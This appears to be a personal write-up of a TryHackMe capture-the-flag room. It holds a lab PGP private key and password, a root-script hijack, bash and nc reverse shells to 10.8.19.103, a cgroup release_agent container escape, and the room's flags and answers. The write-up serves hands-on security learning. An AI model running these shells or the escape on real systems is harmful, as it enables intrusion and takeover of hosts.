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
=tzxj
-----END PGP PRIVATE KEY BLOCK-----

passphrase

door@cave:~$ nano info.txt

After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man sp>
The private key password is breakingbonessince1982 ^[[A
It looks like the skeleton doesn't want to let anyone pass through.

door@cave:~$ cat -v info.txt
cat -v info.txt
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
The private key password is breakingbonessince1982 ^[[A
It looks like the skeleton doesn't want to let anyone pass through.


┌──(witty㉿kali)-[~/Downloads]
└─$ gpg --import adventurer.priv
gpg: key FFF6C0EECD850FDC: "adventurer <adventurer@cave.com>" not changed
gpg: key FFF6C0EECD850FDC: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1


┌──(witty㉿kali)-[~/Downloads]
└─$ scp -P 2222 door@10.10.202.200:/home/door/oldman.gpg .
door@10.10.202.200's password: 
oldman.gpg                                                  100%  772     2.0KB/s   00:00    

┌──(witty㉿kali)-[~/Downloads]
└─$ gpg --import adventurer.priv
gpg: key FFF6C0EECD850FDC: "adventurer <adventurer@cave.com>" not changed
gpg: key FFF6C0EECD850FDC: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1

┌──(witty㉿kali)-[~/Downloads]
└─$ gpg --output message --no-tty oldman.gpg 
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: Note: secret key D5A213D292A0A259 expired at Fri 26 Aug 2022 07:07:51 PM EDT
gpg: encrypted with 3072-bit RSA key, ID D5A213D292A0A259, created 2020-08-26
      "adventurer <adventurer@cave.com>"
                                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ cat message      
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh door@10.10.202.200 -p2222
door@10.10.202.200's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Jul  1 21:29:01 2023 from 10.8.19.103
door@cave:~$ ls
adventurer.priv  info.txt  oldman.gpg  skeleton
door@cave:~$ pwd
/home/door
door@cave:~$ export INVENTORY=bone-breaking-war-hammer
door@cave:~$ ./skeleton 
skeleton:sp00kyscaryskeleton

door@cave:~$ su skeleton
Password: 
skeleton@cave:/home/door$ cd ../skeleton/
skeleton@cave:~$ ls
info.txt
skeleton@cave:~$ cat info.txt 
After successfully defeating the skeleton with the bone-breaking-war-hammer you went forward.
In front of you there's a big opening and after it there's a huge tree that seems magical, you can feel the freedom!
But although you can see it, you can't go to it because there's an invisible wall that keeps you from getting to the root of the tree.

skeleton@cave:~$ sudo -l
Matching Defaults entries for skeleton on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User skeleton may run the following commands on localhost:
    (root) NOPASSWD: /bin/kill

skeleton@cave:~$ cd /opt/link/
skeleton@cave:/opt/link$ ls
startcon
skeleton@cave:/opt/link$ ls -lah
total 8.0K
drwxrwxrwx 2 root     root     4.0K Aug 28  2020 .
drwxr-xr-x 1 root     root     4.0K Aug 27  2020 ..
lrwxrwxrwx 1 skeleton skeleton   16 Aug 27  2020 startcon -> ../root/start.sh
skeleton@cave:/opt/link$ cat startcon 
cat: startcon: No such file or directory
skeleton@cave:/opt/link$ mv ./startcon /tmp
skeleton@cave:/opt/link$ cd /tmp
skeleton@cave:/tmp$ ls
f  hsperfdata_cave  hsperfdata_root  startcon
skeleton@cave:/tmp$ cat startcon 
#!/bin/bash

service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"

/bin/bash


skeleton@cave:/tmp$ cat /proc/1/cgroup
12:devices:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
11:rdma:/
10:perf_event:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
9:freezer:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
8:blkio:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
7:cpuset:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
6:memory:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
5:pids:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
4:cpu,cpuacct:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
3:hugetlb:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
2:net_cls,net_prio:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
1:name=systemd:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
0::/system.slice/snap.docker.dockerd.service

The command `sudo /bin/kill -9 1` is used to forcefully terminate the process with PID 1, which is typically the main process running inside a container. Sending the SIGKILL signal (-9) to the process causes it to be immediately terminated without the opportunity to perform any cleanup or shutdown procedures.

It's important to note that forcefully terminating the main process with SIGKILL can lead to unexpected consequences and potential data loss. It should be used as a last resort when other methods of stopping the container gracefully are not working.

Before using the `kill -9` command, it's generally recommended to try the `kill` command with the SIGTERM signal (-15) first, allowing the process to perform any necessary cleanup tasks before shutting down. This gives the process a chance to terminate gracefully and ensures the container is stopped properly.

skeleton@cave:/tmp$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   3980  2832 pts/0    Ss+  20:32   0:00 /bin/bash /root/start.sh
root        21  0.0  0.2  12164  4184 ?        Ss   20:32   0:00 sshd: /usr/sbin/sshd [listener] 0 o
root        48  0.0  0.9 195800 19212 ?        Ss   20:32   0:00 /usr/sbin/apache2 -k start
www-data    52  0.0  0.7 196292 15988 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    53  0.0  0.7 196280 15584 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    54  0.0  0.6 196104 14120 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    55  0.0  0.6 196104 14068 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    56  0.0  0.4 196104 10008 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
root        59  0.0  0.1   5272  3292 pts/0    S+   20:32   0:00 su - cave -c cd /home/cave/src; ./r
cave        60  0.0  0.1   3980  2940 ?        Ss   20:32   0:00 -bash -c cd /home/cave/src; ./run.s
cave        62  0.0  0.1   3900  2752 ?        S    20:32   0:00 /bin/bash ./run.sh
cave        73  0.0  1.7 2376984 35276 ?       Sl   20:32   0:03 java -cp .:commons-io-2.7.jar RPG
www-data    83  0.0  0.7 196096 14944 ?        S    20:38   0:00 /usr/sbin/apache2 -k start
cave        86  0.0  0.0   2612   536 ?        S    20:57   0:00 /bin/sh -c echo "trying";rm /tmp/f;
cave        90  0.0  0.0   2656   584 ?        S    20:57   0:00 cat /tmp/f
cave        91  0.0  0.0   2612   540 ?        S    20:57   0:00 /bin/sh -i
cave        92  0.0  0.0   3336  2032 ?        S    20:57   0:00 nc 10.8.19.103 1234
cave       238  0.0  0.3  10308  7152 ?        S    21:08   0:00 python -c import pty;pty.spawn("/bi
cave       239  0.0  0.1   4244  3328 pts/1    Ss   21:08   0:00 /bin/bash
root       484  0.0  0.1   5736  3696 pts/1    S    21:12   0:00 su door
door       485  0.0  0.1   4244  3464 pts/1    S+   21:12   0:00 bash
door       512  0.0  0.1  78264  3268 ?        Ss   21:27   0:00 gpg-agent --homedir /home/door/.gnu
root       540  0.0  0.4  13868  9008 ?        Ss   21:31   0:00 sshd: door [priv]
door       555  0.0  0.2  13868  5292 ?        S    21:31   0:00 sshd: door@pts/2
door       556  0.0  0.1   5996  3816 pts/2    Ss   21:31   0:00 -bash
root       582  0.0  0.1   7504  4040 pts/2    S    21:37   0:00 su skeleton
skeleton   583  0.0  0.1   5996  3980 pts/2    S    21:37   0:00 bash
skeleton   603  0.0  0.1   7636  3188 pts/2    R+   21:46   0:00 ps aux
skeleton@cave:/tmp$ ps -e
  PID TTY          TIME CMD
    1 pts/0    00:00:00 start.sh
   21 ?        00:00:00 sshd
   48 ?        00:00:00 apache2
   52 ?        00:00:00 apache2
   53 ?        00:00:00 apache2
   54 ?        00:00:00 apache2
   55 ?        00:00:00 apache2
   56 ?        00:00:00 apache2
   59 pts/0    00:00:00 su
   60 ?        00:00:00 bash
   62 ?        00:00:00 run.sh
   73 ?        00:00:03 java


skeleton@cave:/tmp$ cat startcon 
#!/bin/bash

service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"

bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
/bin/bash

skeleton@cave:/tmp$ nano startcon 
skeleton@cave:/tmp$ sudo /bin/kill -9 1
skeleton@cave:/tmp$ sudo /bin/kill -9 73

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.202.200] 60188
root@cave:/# ls           ls
ls
app
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@cave:/# cd /root     cd /root
cd /root
root@cave:~# ls           ls
ls
info.txt
start.sh
root@cave:~# cat info.txt cat info.txt
cat info.txt
You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
You could feel the cave rumbling, like it was the end for you and then all went black.
But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.

You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.

Flag:THM{no_wall_can_stop_me}
root@cave:~# which python which python
which python
/usr/bin/python
root@cave:~# python -c 'impython -c 'import pty;pty.spawn("/bin/bash")'

scaping container

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1

root@cave:~# ip link add dip link add dummy0 type dummy
ip link add dummy0 type dummy

root@cave:~# ip addr      ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:87:a7:5f:67:0b brd ff:ff:ff:ff:ff:ff
    inet 10.10.202.200/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3584sec preferred_lft 3584sec
    inet6 fe80::87:a7ff:fe5f:670b/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:1c:97:3a:f1 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: dummy0: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 22:59:0e:84:fb:27 brd ff:ff:ff:ff:ff:ff

root@cave:~# ip link delete dummy0
ip link delete dummy0
root@cave:~# ip addr       ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:87:a7:5f:67:0b brd ff:ff:ff:ff:ff:ff
    inet 10.10.202.200/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3540sec preferred_lft 3540sec
    inet6 fe80::87:a7ff:fe5f:670b/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:1c:97:3a:f1 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever



mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"


root@cave:~# lft forever pmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
r /tmp/cgrp/xrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir
root@cave:~# echo 1 > /tmp/echo 1 > /tmp/cgrp/x/notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release
root@cave:~# host_path=`sedhost_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@cave:~# echo "$host_paecho "$host_path/cmd" > /tmp/cgrp/release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent
root@cave:~# echo '#!/bin/secho '#!/bin/sh' > /cmd
echo '#!/bin/sh' > /cmd
root@cave:~#               echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f" >> /cmd
.103 1337 >/tmp/f" >> /cmdp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.
root@cave:~# chmod a+x /cmdchmod a+x /cmd
chmod a+x /cmd
root@cave:~# sh -c "echo \sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

┌──(witty㉿kali)-[~/Downloads/CCT2019/results]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.202.200] 43884
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
info.txt
snap
# cat info.txt
You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.

Flag:THM{digging_down_then_digging_up}


```

![[Pasted image 20230630201311.png]]

What was the weird thing carved on the door?  

After getting it to work with POST, you can try it with GET

	*^ed[h#f]{3}[123]{1,2}xf[!@#*]$*

What weapon you used to defeat the skeleton?  

Take a second look in the text files

*bone-breaking-war-hammer*

What is the cave flag?  

*THM{no_wall_can_stop_me}*

What is the outside flag?

*THM{digging_down_then_digging_up}*

[[Takedown]]